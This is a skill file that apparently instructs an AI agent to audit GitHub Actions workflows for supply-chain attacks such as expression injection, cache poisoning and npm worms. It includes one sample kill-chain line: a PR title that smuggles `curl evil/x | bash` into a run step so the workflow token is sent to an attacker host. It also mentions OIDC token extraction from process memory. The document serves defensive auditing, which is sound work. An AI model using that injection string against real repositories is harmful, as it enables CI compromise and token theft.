---
name: audit-github-actions
description: Audit GitHub Actions workflows for supply-chain and CI/CD security vulnerabilities — script injection, expression injection, token exfiltration, unpinned actions, cache poisoning, and Shai-Hulud-class self-replicating worms. Use when the user asks to audit, review, or check the security of GitHub Actions, workflows, CI/CD pipelines, or asks about supply-chain risk, npm publish security, or Shai-Hulud.
user-invocable: true
---

# Audit GitHub Actions

You are auditing public open-source workflows for supply-chain risk. The adversary is a real-world worm operator (Shai-Hulud, Nx s1ngularity, tj-actions, TanStack, qix). Treat every PR field as hostile input, every secret as bait, every third-party action as a potential supply-chain pivot.

## Threat model

Modern attacks on public OSS chain together:

1. **Expression injection in privileged triggers** — `${{ github.event.* }}` from a PR title, comment, or branch name lands in a `run:` step under `pull_request_target` / `issue_comment` / `workflow_run`. The Nx s1ngularity vector.
2. **Cache poisoning across trust boundaries** — a low-privilege `pull_request_target` workflow writes into a cache scope that a high-privilege release workflow later restores from. `permissions: contents: read` does _not_ block cache writes (the runner uses an internal token), and OIDC tokens minted with `id-token: write` are extractable from `/proc/<pid>/mem` during the privileged run. (TanStack, May 2026).
3. **Compromised third-party actions** — tag mutability lets a force-pushed tag silently roll all consumers onto malicious code (tj-actions / reviewdog, March 2025).
4. **Install-time RCE** — `preinstall` / `postinstall` hooks running before any test or scan. Every npm worm in the catalogue.
5. **Self-propagation** — stolen npm token enumerates the maintainer's other packages and republishes them with the same payload (Shai-Hulud, Shai-Hulud 2.0).
6. **CI persistence** — malicious `.github/workflows/*.yml` written into every repo the stolen `GITHUB_TOKEN` can reach; self-hosted runner registration for ongoing RCE.
7. **Public-by-design exfil** — secrets pushed to attacker-owned public repos, victim-owned `*-migration` repos, or double-base64 into public workflow logs.

Your job is to find the **first link in any such chain** that exists in this repo, and explain it as a kill chain the user can act on.

## Audit flow

Run these steps in order. Steps 2a/2b/2c run in parallel.

1. **Detect audit surface.** Enumerate:
   - `.github/workflows/*.yml` and `*.yaml`
   - Repo-root `action.yml` / `action.yaml` (if the repo publishes an action)
   - For each `run:` block: scripts invoked via `pnpm/npm/yarn/bun run X`, `bash X.sh`, `make X`, `just X` → resolve to local files

2. **Run in parallel:**
   - **2a.** Spawn a sub-agent (Agent tool, `general-purpose`) for historical & IOC sweep. Brief it with the contents of [historical-audit.md](historical-audit.md). It returns a focused finding list.
   - **2b.** Detect deterministic tooling and run any that is installed. See [tools.md](tools.md).
   - **2c.** Load the per-surface docs you need ([workflows.md](workflows.md), [composite-actions.md](composite-actions.md), [scripts.md](scripts.md)). Walk the execution graph: read every workflow YAML, then every local file each one transitively references. Terminate the recursion at external binaries on PATH, at third-party action sources, and at network fetches (treat the latter as a finding).

3. **Verify third-party action pin legitimacy.** `pinact run --check --verify` is authoritative — it resolves each `uses: owner/repo@<sha> # vX.Y.Z` annotation against the GitHub API and flags any SHA that does not match the claimed version. This catches force-pushed tags and pins where the SHA points at a different commit than the comment claims, and it handles annotated-tag dereferencing internally. Run with `GITHUB_TOKEN` set to avoid rate limits. Mismatch or unpinned = High finding. See [tools.md](tools.md) for the required-tools setup; if `pinact` is not installed, install it before this step.

   `pinact` does not cover two cases — the agent owns these:
   - **Pins missing a version-annotation comment.** `pinact --verify` only validates `uses: owner/repo@<sha> # vX.Y.Z`. Grep the workflow surface for `uses: [^#]+@[0-9a-f]{40}\s*$` (no trailing comment) and flag each as Medium — the pin is opaque and cannot be audited without an annotation. Suggest the user add `# vX.Y.Z` and re-run.
   - **Owner liveness / repojacking.** Once per unique `owner`, run `curl -sI -o /dev/null -w "%{http_code} %{redirect_url}\n" https://github.com/<owner>`. A `404` (namespace unclaimed) or `3xx` redirect (owner renamed) means the action is **repojackable** — see [workflows.md](workflows.md) §14. Flag even when the pinned SHA still resolves, because future ref bumps are exposed.

4. **Reason holistically.** Load the relevant context (the workflow graph, the sub-docs) and synthesize attack paths. Pattern-matching alone misses xz-utils-style multi-stage payloads. Use [checklist.md](checklist.md) as a prompt for what to look for, [incidents.md](incidents.md) when an unfamiliar shape looks like a variant of a known attack.

5. **Fold findings.** Merge sub-agent + tooling + your own findings. Dedupe (same file:line + same pattern = one finding, multiple sources). Drop low-confidence noise.

6. **Print the report.** Severity-first (Critical → High → Medium → Low). For every finding emit:
   - **Pattern** (one line)
   - **Locations** (`file:line`, multiple if applicable)
   - **Why it matters** (one line, with a real-world incident anchor when one exists)
   - **Attacker repro / kill chain** (concrete end-to-end steps an attacker takes — `attacker forks repo → opens PR titled '\'; curl evil/x | bash #' → workflow lint.yml line 42 interpolates title into run: → token POSTed to evil → token used to republish on npm`)
   - **Fix** (snippet from [remediation.md](remediation.md))
   - **Source** (which input found it: agent / zizmor / actionlint / sub-agent)
   - **Refs** (links to authoritative docs)

7. **Stop.** Do not edit workflows. Do not commit. Do not open PRs. The user decides what to do next.

## Anti-noise rules

- Critical/High = real exploit paths only, with a concrete repro chain. If you cannot describe how an attacker exploits it, downgrade or drop it.
- Medium/Low go in a single "Additional observations" rollup, terse, no per-finding cards.
- No padding. No restating absences ("no `pull_request_target` found, no self-hosted runners found"). If clean, say "No findings" and list the categories that were checked.
- Format the report naturally. Do not follow a rigid template — convey the fields above however reads best for the findings at hand.

## Non-goals

- No CVE / license / code-quality audit (use `npm audit`, Socket, Snyk for those).
- No edits, commits, PRs, or remote mutation (`gh api` reads only).
- No recursion into third-party action source code — pin legitimacy is the boundary.
- No grades / scores / pass-fail. The findings speak for themselves.
- No false-positive suppression mechanism in v1; every run is independent.

## Scope arg

If invoked without args, audit every surface in the repo. If invoked with a file path, audit only that file and its transitive references — but still spawn the historical sub-agent (the IOC sweep is repo-wide and cheap).

If invoked with a GitHub URL (e.g. `https://github.com/<owner>/<repo>` or `git@github.com:<owner>/<repo>.git`), audit a fresh clone instead of the current working tree.

Clone target: `.audit-github-actions/<slug>` under cwd, where `<slug> = <owner>__<repo>` (lowercase, strip trailing `.git`, strip any `/tree/<ref>` first). Use this **literal** path everywhere — never assign to a shell variable; `$VAR` expansion forces the rm hook to ask later, breaking AFK runs.

1. **Partial clone, all refs**: `git clone --filter=blob:none <url> .audit-github-actions/<slug>`. **No `--depth 1` / `--single-branch`** — the IOC sub-agent (step 2a) needs every branch/tag for stale-workflow and `git log --all` sweeps. `--filter=blob:none` lazy-loads blobs; grep/log/for-each-ref still work transparently. If the dir already exists from a prior audit, run `git -C .audit-github-actions/<slug> fetch --all --prune` instead.
2. If the URL points at `/tree/<ref>`, after cloning run `git -C .audit-github-actions/<slug> checkout <ref>`. Keep all other refs.
3. Run the audit against `.audit-github-actions/<slug>`. **Never `cd` into the clone** — pass the path explicitly (`git -C .audit-github-actions/<slug> …`, `actionlint .audit-github-actions/<slug>/.github/workflows/*.yml`). `cd path && cmd` defeats the per-tool allowlist.
4. Render `file:line` paths as repo-relative (strip the `.audit-github-actions/<slug>/` prefix). Note `git -C .audit-github-actions/<slug> rev-parse HEAD` in the report header so the audit is reproducible.
5. **Do not delete the clone.** Leave it in place so re-audits can `fetch` instead of re-clone. The user wipes the cache with `rm -rf .audit-github-actions/` themselves; suggest they add `.audit-github-actions/` to `.gitignore` (or `~/.gitignore_global`) so it doesn't pollute `git status`.

Do not push, fetch additional refs beyond what step 1 needs, or write into the clone.
